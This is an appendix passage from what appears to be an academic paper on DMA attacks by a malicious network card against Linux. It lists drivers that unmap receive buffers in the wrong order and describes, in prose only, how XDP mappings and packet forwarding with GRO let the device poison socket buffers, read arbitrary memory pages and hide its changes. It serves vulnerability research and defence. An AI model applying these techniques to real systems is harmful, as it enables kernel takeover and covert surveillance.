\subsection{Wrong Unmap order}{\label{apndx:wrong_order}}
A partial list of drivers that dont unmap the RX buffer or do it \textbf{after} initialising the \shinfo.
\begin{itemize}

    \item Intel 40GbE NIC driver : i40e
    \item Mellanox Connectx 5/6 : mlx5\_core\footnote{mlx5\_core has two modes, linear and non-linear. Linear mode is the default}
\end{itemize}
\subsection{Correct unmap order}
{\label{apndx:correct_order}}
A partial list of drivers that unmap the RX buffer before initialising the \shinfo 
\begin{itemize}
    \item Broadcom : bnx2
\end{itemize}

%\clearpage
\section{Additional Compound attacks}

\subsection{eXpress Data Path}\label{sec:xdp}

eXpress Data Path (XDP)~\cite{xdp} provides a way for users to add custom handling to RX buffers with little overhead. Common use cases include DDOS mitigation, forwarding and load balancing. To support the latter, the RX buffers are mapped with BIDIRECTIONAL access to the NIC. 

The tg3 driver does not support XDP. XDP support is usually added to high-speed NICs, such as ConnectX-4 (mlx5\_core). Accordingly, in this attack, we focus on the mlx5\_core driver, which, as mentioned in Sec, \ref{sec:forward}, does not unmap the RX buffers and reuses the pages using the page\_pool mechanism \cite{page_pool}. Subsequently, these pages are never unmapped, and remain accessible to the device for both reading and writing. 

The fact that the NIC has both read and write access to \shinfo, allows the NIC to execute an attack in 4 steps (Fig. \ref{fig:gro_xdp}):
\begin{enumerate}
    \item An RX TCP packet is generated. Then, the \shinfo{} is initialised by the driver and the \texttt{frags} are filled with NULL pointers. Finally, the packet is handed to the next layer.
    
    \item A second RX \skb{} is generated as part of the same TCP stream, initialized and also handed to the next layer.
    
    \item Both packets reach the GRO layer. Then, the second \skb{} is coalesced with the first packet, the \skb{} is freed and the \data{} is added as a \texttt{frag} to the first \skb.
    
    \item The NIC reads the updated \texttt{frag} field and translates the \page{} address to a valid \kva{}. Finally, the device fills the \texttt{destructor\_arg} field, creating a poisoned \skb{} (Fig. \ref{fig:sh_info}).
\end{enumerate}

The difference between this flow and a regular receive flow is the additional read capability the NIC has due to XDP. That is, the last step, where \means{} is obtained, is possible only due to the additional READ access.

\smallskip
\noindent\textbf{Remark.} Other drivers that have XDP support, also tend to map RX buffers with BIDIRECTIONAL (e.g., bnxt, i40e, mlx4\_en). Interestingly, the mlx5\_core driver has two modes of operation: (1) linear - where an skb is built around an RX buffer and, (2) non-linear where the driver is filling up the \texttt{frags} of \shinfo, which was never mapped. The former is the default, and the later is actually secure. The non-linear mode is secure because \shinfo{} is \emph{never} accessible to the device. Thus the NIC never gains the \oportunity{} to attack.

\begin{figure*}[t]
    \centering
    \includegraphics[width=\linewidth]{figs/gro.pdf}
    \caption{An RX \skb{} after GRO used as a \means{} for a DMA attack.}
    \label{fig:gro_xdp}
\end{figure*}

\subsection{Forward Thinking}\label{sec:forward}

Packet forwarding is a standard Linux feature that allows a Linux machine to serve as a router or a load balancer. Packet forwarding functionality is usually disabled by default on Linux servers.

When this functionality is enabled, the NIC can independently generate an RX packet to a legitimate destination. This packet will then be forwarded to become a TX packet. However, unlike in the TCP layer that usually creates \skb{} packets with fragments, both the tg3 and the mlx5\_core drivers, usually create a linear \skb{}.

Namely, the drivers do not fill the \texttt{frags}, which the attacker uses to obtain \means{}. Both drivers, use the \texttt{napi\_gro\_receive} function to pass the \skb{} to the upper layer (this is the standard for most NIC drivers\footnote{Used by 98 NIC drivers, in Linux 5.0}). 

In this case, the upper layer is the Generic Receive Offload (GRO) layer \cite{gro}. GRO attempts to aggregate multiple TCP segments into a single large packet. Specifically, GRO converts multiple linear \skb{} buffers (belonging to a single TCP stream) into a single \skb{} with multiple fragments. This \skb{} then traverses the Linux network stack and becomes a TX packet. The attacker can use this TX packet as described in the previous attack (Fig. \ref{fig:payload}).

Packet forwarding, also opens up an additional attack option. An attacker might be interested in persistent surveillance rather than overtaking the machine. 

Packet forwarding allows the NIC to inspect arbitrary pages at will. 
Instead of sending a TCP packet and letting the GRO layer fill in the \texttt{frags} information, the NIC can generate a small UDP packet and fill in the \texttt{frags} array with any arbitrary \page{} addresses within the system. This results in the mapping of these pages by the driver, providing READ access to any page in the system to the NIC. Both the mlx5\_core and tg3 drivers map all the frags in \shinfo{} without verifying the actual packet length.

To avoid detection and, more importantly, preserve OS stability, the device must undo the changes to \shinfo{} before creating a TX completion. That is, before letting the CPU know that the packet was sent and its buffer can now be freed. Otherwise, the OS will try freeing the pages, indicated by \shinfo.

\smallskip
\noindent\textbf{Remark.} Having an accomplice in the form of an unprivileged user provides an additional vectors of attack. In addition to running ROP attacks, the NIC can also leak the content of arbitrary memory pages to the user. Assuming that the NIC has WRITE access to \shinfo{} after it has been sent up the network stack (for example, in case of deferred protection or when page\_pool is used, Sec. \ref{sec:xdp}), the NIC can modify the \page{} address in the \texttt{frag} entries, letting the Linux network stack copy the context of arbitrary memory pages to an unprivileged user. A likely side effect of this attack is memory corruption and Kernel panic, so caution is advised. The reason being, that the \texttt{skb\_free} function attempts to free pages never owned by the network stack.

%%%%%%%%%%%%%%%%%%%%%%%%%

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\end{document}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
